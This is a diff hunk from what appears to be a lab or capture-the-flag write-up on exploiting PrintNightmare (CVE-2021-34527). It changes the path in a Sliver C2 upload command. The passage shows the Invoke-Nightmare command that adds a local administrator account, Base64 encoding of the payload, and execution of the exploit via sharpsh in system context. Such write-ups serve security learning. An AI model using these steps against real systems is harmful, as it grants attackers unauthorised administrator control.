@@ -228,7 +228,7 @@ PrintNightmare is a vulnerability in the Windows Print Spooler service. When spe
 
 A proof-of-concept (PoC) exploit script for CVE-2021–34527, available at https://github.com/JohnHammond/CVE-2021-34527, was chosen. A PowerShell payload was crafted to be executed by the exploit. This payload aimed to create a new local user named Toothless5143 with the password Password123 and add this user to the local Administrators group. The command was: Invoke-Nightmare -DriverName "Xerox3010" -NewUser "Toothless5143" -NewPassword "Password123". This PowerShell command was then Base64 encoded, as often required by PowerShell execution contexts. The PoC script (CVE-2021-34527.ps1) was uploaded to file01.
 
-sliver (puppet-mtls) > upload /home/toothless5143/CVE-2021-34527.ps1
+sliver (puppet-mtls) > upload /puppet/CVE-2021-34527.ps1
 
 [*] Wrote file to C:\temp\CVE-2021-34527.ps1
 The PrintNightmare exploit was then executed using sharpsh, with -i for interactive mode, -s for system context, -u to specify the exploit script, and -e to provide the Base64-encoded payload.
